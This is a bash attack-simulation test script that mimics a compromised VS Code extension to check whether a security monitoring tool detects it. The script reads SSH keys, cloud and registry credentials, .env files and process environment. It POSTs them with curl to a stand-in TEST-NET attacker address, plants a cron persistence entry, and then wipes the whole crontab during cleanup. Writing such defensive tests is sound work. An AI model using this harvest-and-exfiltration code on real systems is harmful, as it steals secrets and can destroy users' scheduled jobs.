#!/bin/bash
# tests/attack-sim/cred-steal-fake-vscode-ext.sh
#
# AUTHORIZED SECURITY TEST. Run only on hosts the operator owns.
#
# Mimics a compromised VS Code extension stage of nx-console / Tanstack
# (GHSA-c9j4-9m59-847w). The "extension" runs as root (worst-case
# threat model), reads cataloged credential paths, and tries to
# exfiltrate to an attacker IP using TEST-NET-1 RFC5737 192.0.2.42
# so no real traffic ever leaves the host.
#
# Expected behaviour with xhelix-USG installed + .aws/credentials
# sealed:
#   1. Read attempts on .aws/credentials.sealed → ciphertext only;
#      attacker gets non-credential bytes
#   2. Outbound POST to 192.0.2.42 → flagged by tainted-egress
#      (when USG.4 ships) AND by the static IOC list (if added)
#   3. Pipeline-emitted alerts: process_spawn_burst (this script
#      forks many curls), file_read_burst (reads many paths)
#
# Expected behaviour BEFORE xhelix-USG:
#   1. Read .aws/credentials directly → plaintext exfil succeeds
#   2. Outbound to 192.0.2.42 → caught only if IP in IOC, else
#      invisible until autobaseline seals

set -u  # not -e: we want to keep going even when reads fail

ATTACKER_IP="192.0.2.42"            # TEST-NET-1
ATTACKER_URL="http://${ATTACKER_IP}:8080/intake"
DRY_RUN="${DRY_RUN:-0}"             # set DRY_RUN=1 to skip the curl

log() { echo "[fake-ext $(date +%H:%M:%S)] $*"; }

log "=== fake VS Code extension activated as $(whoami) (uid=$(id -u)) ==="

# Step 1: enumerate juicy paths (mimics the typical credential-
# harvest behaviour from public malware family analyses)
CREDS_FOUND=""
for path in \
    "$HOME/.aws/credentials" \
    "$HOME/.aws/credentials.sealed" \
    "$HOME/.aws/config" \
    "$HOME/.kube/config" \
    "$HOME/.docker/config.json" \
    "$HOME/.npmrc" \
    "$HOME/.gitconfig" \
    "$HOME/.ssh/id_rsa" \
    "$HOME/.ssh/id_ed25519" \
    "$HOME/.ssh/config" \
    "$HOME/.git-credentials" \
    "/etc/environment" \
    "/proc/self/environ" \
    ; do
    if [ -r "$path" ]; then
        content="$(cat "$path" 2>/dev/null | head -c 4096)"
        bytes=${#content}
        log "READ $path → $bytes bytes"
        CREDS_FOUND="${CREDS_FOUND}=====${path}=====\n${content}\n"
    else
        log "SKIP $path (not readable / not present)"
    fi
done

# Step 2: scan workspace for inline secrets (mimics the regex-scan
# stage of Megalodon)
log "--- workspace secret scan ---"
for d in "$HOME" /etc /var/www /opt; do
    if [ -d "$d" ]; then
        # Don't actually grep root with -r (would be slow + noisy);
        # just attempt a small handful.
        for f in "$d"/.env "$d"/*.env "$d"/config.json "$d"/secrets.yaml; do
            if [ -r "$f" ] 2>/dev/null; then
                log "READ-ENV $f"
                CREDS_FOUND="${CREDS_FOUND}=====${f}=====\n$(cat "$f" 2>/dev/null | head -c 1024)\n"
            fi
        done
    fi
done

# Step 3: exfiltrate (the loud one — should be caught even today
# by static IOC if 192.0.2.42 is added, or by tainted-egress in USG.4)
log "--- exfil attempt → $ATTACKER_URL ---"
if [ "$DRY_RUN" = "1" ]; then
    log "DRY_RUN=1, skipping curl"
else
    # Use a short timeout — TEST-NET addresses never respond.
    # The exfil is the *attempt*, which is the network event xhelix
    # should see and flag.
    echo -e "$CREDS_FOUND" | \
        timeout 3 curl -s -m 2 --connect-timeout 2 \
            -X POST "$ATTACKER_URL" \
            -H "X-Agent: nx-console-payload" \
            --data-binary @- 2>&1 | head -1 || true
    log "(curl returned; TEST-NET is unreachable so outbound failure is expected)"
fi

# Step 4: drop persistence to make sure xhelix catches the
# Class-1 hard invariant rules even when sealed credentials
# rendered the cred-theft stage harmless
log "--- persistence drop ---"
echo "* * * * * /tmp/xhelix-attack-test-marker" | crontab - 2>&1 | head -1 || true
crontab -l 2>/dev/null | grep -q xhelix-attack-test-marker && \
    log "PERSISTED cron entry" || \
    log "(crontab unavailable)"

# Cleanup
crontab -r 2>/dev/null || true
log "=== fake VS Code extension finished ==="
